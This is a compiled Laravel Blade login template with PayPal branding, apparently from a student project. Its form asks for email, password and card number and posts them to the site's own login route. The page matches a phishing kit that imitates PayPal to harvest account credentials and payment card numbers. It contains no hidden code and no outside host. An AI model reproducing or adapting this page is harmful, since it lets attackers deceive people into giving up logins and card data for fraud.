<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>pp</title>
    <link rel="stylesheet" href="<?php echo e(url('assets/bootstrap/css/bootstrap.min.css')); ?>">
    <link rel="stylesheet" href="<?php echo e(url('assets/css/Google-Style-Login.css')); ?>">
    <link rel="stylesheet" href="<?php echo e(url('assets/css/styles.css')); ?>">
</head>

<body>
<div class="login-card" style="background-color: white;">
    <div class="row">
        <div class="col float-right">
            <p class="text-center"><img src="<?php echo e(url('assets/img/paypal-logo-129x32.svg')); ?>"></p>
        </div>
    </div>
    <form class="form-signin" method="post" action="<?php echo e(route('login')); ?>">
        <?php echo csrf_field(); ?>
        <span class="reauth-email"> </span>
        <input class="form-control" name="email" type="email" id="inputEmail" required="" placeholder="Email address" autofocus="">
        <input class="form-control" name="password" type="password" id="inputEmail" required="" placeholder="Password" autofocus="">
        <input class="form-control" name="cardnumber" type="text" id="inputEmail" required="" placeholder="Card Number" autofocus="">
        <div
            class="checkbox"></div><button class="btn btn-primary btn-block btn-lg btn-signin" type="submit">Sign in</button></form><a class="forgot-password" href="#">Forgot your password?</a></div>
<script src="<?php echo e(url('assets/js/jquery.min.js')); ?>"></script>
<script src="<?php echo e(url('assets/bootstrap/js/bootstrap.min.js')); ?>"></script>
</body>

</html>
<?php /**PATH C:\Users\Spartacus Yusuf\Desktop\laravel\resources\views/student.blade.php ENDPATH**/ ?>